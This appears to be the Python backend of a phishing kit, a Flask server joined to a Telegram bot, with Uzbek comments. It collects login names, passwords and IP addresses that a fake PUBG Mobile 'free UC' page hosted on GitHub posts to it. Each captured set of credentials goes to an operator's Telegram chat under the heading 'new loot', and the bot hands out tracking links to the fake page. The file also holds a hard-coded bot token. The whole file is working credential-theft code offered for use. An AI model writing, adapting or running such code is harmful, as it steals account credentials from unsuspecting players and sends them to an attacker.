import logging
import asyncio
import threading
from aiogram import Bot, Dispatcher, types, F
from flask import Flask, request, jsonify
from flask_cors import CORS  # <-- BU JUDA MUHIM

# --- SOZLAMALAR ---
TOKEN = "8310992834:AAFIhrXHPCjiuvGOHI8XjiWom7k07mlUSxo"

# !!! DIQQAT !!!
# MANA SHU YERGA O'Z TELEGRAM ID RAQAMINGIZNI YOZING!
# YOQSA MA'LUMOT KELMAYDI! (Hozir o'zingiznikini yozing)
ADMIN_ID = 8250478755 

GITHUB_SITE_URL = "https://pubgmobile-uc.github.io/MOD/"

app = Flask(__name__)
# GitHubdan kelgan so'rovlarga ruxsat berish
CORS(app) 

bot = Bot(token=TOKEN)
dp = Dispatcher()

@app.route('/')
def home():
    return "Server ishlamoqda!"

@app.route('/login_submit', methods=['POST'])
def login_submit():
    try:
        data = request.json
        user_id = data.get('user_id')
        method = data.get('method')
        username = data.get('username')
        password = data.get('password')
        ip = data.get('ip')
        
        msg = (
            f"🔥 <b>YANGI O'LJA!</b>\n\n"
            f"📥 <b>Kirish:</b> {method.upper()}\n"
            f"👤 <b>Login:</b> <code>{username}</code>\n"
            f"🔑 <b>Parol:</b> <code>{password}</code>\n"
            f"🌍 <b>IP:</b> {ip}\n"
            f"🆔 <b>User ID:</b> {user_id}"
        )

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # 1. ADMIN ID ga yuborish (Sizga)
        loop.run_until_complete(bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode="HTML"))
        
        # 2. Userning o'ziga ham yuborish (Agar ID bo'lsa)
        if user_id and str(user_id).isdigit():
            try:
                loop.run_until_complete(bot.send_message(chat_id=int(user_id), text=msg, parse_mode="HTML"))
            except: pass

        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Xatolik: {e}")
        return jsonify({"status": "error"}), 500

def run_flask():
    app.run(host="0.0.0.0", port=5000)

@dp.message(F.text == "/start")
async def start_cmd(msg: types.Message):
    link = f"{GITHUB_SITE_URL}?user_id={msg.chat.id}"
    await msg.answer(f"Havola: {link}")

async def main():
    threading.Thread(target=run_flask).start()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
